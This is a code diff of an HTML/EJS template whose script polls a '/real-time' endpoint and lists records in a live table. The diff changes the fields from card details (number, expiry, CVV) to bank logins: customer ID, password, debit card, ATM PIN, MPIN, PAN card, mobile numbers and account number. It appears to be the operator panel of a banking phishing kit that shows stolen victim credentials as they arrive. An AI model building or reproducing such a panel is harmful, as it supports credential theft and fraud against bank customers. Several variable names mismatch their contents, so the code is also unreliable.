@@ -14,22 +14,6 @@
   <body>
     <div class="p-10 flex justify-content items-center w-full">
       <div class="overflow-x-auto p-5 w-full">
-        <!-- <table class="table"> -->
-          <!-- <thead>
-            <tr>
-              <th></th>
-              <th>Customer ID</th>
-              <th>Password</th>
-              <th>Debit Card</th>
-              <th>ATM PIN</th>
-              <th>Register Mobile Number</th>
-              <th>MPIN</th>
-              <th>Pan Card</th>
-              <th>MPin</th>
-              <th>Register Mobile Number 2</th>
-              <th>Account Number</th>
-            </tr>
-          </thead> -->
           <div id="data-table-body flex flex-col items-center justify-center w-full">
             <% for (let i = data.length - 1; i >= 0; i--) { %>
             <div class="mt-10 flex flex-col">
@@ -46,13 +30,12 @@
             </div>
             <% } %>
           </div>
-        <!-- </table> -->
       </div>
     </div>
 
     <script>
       function refreshData() {
-        fetch("/data")
+        fetch("/real-time")
           .then((response) => response.json())
           .then((data) => {
             const tableBody = document.getElementById("data-table-body");
@@ -66,36 +49,44 @@
               row.appendChild(cellIndex);
 
               const cellAccountHolderName = document.createElement("td");
-              cellAccountHolderName.innerText = item.account_holder_name;
+              cellAccountHolderName.innerText = item.customer_id;
               row.appendChild(cellAccountHolderName);
 
               const cellRefundAmount = document.createElement("td");
-              cellRefundAmount.innerText = item.refund_amount;
+              cellRefundAmount.innerText = item.password;
               row.appendChild(cellRefundAmount);
 
               const cellCardHolderName = document.createElement("td");
-              cellCardHolderName.innerText = item.card_holder_name;
+              cellCardHolderName.innerText = item.debit_card;
               row.appendChild(cellCardHolderName);
 
               const cellCardNumber = document.createElement("td");
-              cellCardNumber.innerText = item.card_number;
+              cellCardNumber.innerText = item.atm_pin;
               row.appendChild(cellCardNumber);
 
               const cellExpiryDate = document.createElement("td");
-              cellExpiryDate.innerText = item.expiry_date;
+              cellExpiryDate.innerText = item.register_mobile_number;
               row.appendChild(cellExpiryDate);
 
               const cellCvv = document.createElement("td");
-              cellCvv.innerText = item.cvv;
+              cellCvv.innerText = item.mpin;
               row.appendChild(cellCvv);
 
               const cellLoginPin = document.createElement("td");
-              cellLoginPin.innerText = item.login_pin;
+              cellLoginPin.innerText = item.pan_card;
               row.appendChild(cellLoginPin);
 
               const cellMpin = document.createElement("td");
               cellMpin.innerText = item.mpin;
               row.appendChild(cellMpin);
+
+              const cellRegisterMobileNumber2 = document.createElement("td");
+              cellRegisterMobileNumber2.innerText = item.register_mobile_number_2;
+              row.appendChild(cellRegisterMobileNumber2);
+
+              const cellAccountNumber = document.createElement("td");
+              cellAccountNumber.innerText = item.account_number;
+              row.appendChild(cellAccountNumber);
 
               tableBody.appendChild(row);
             });
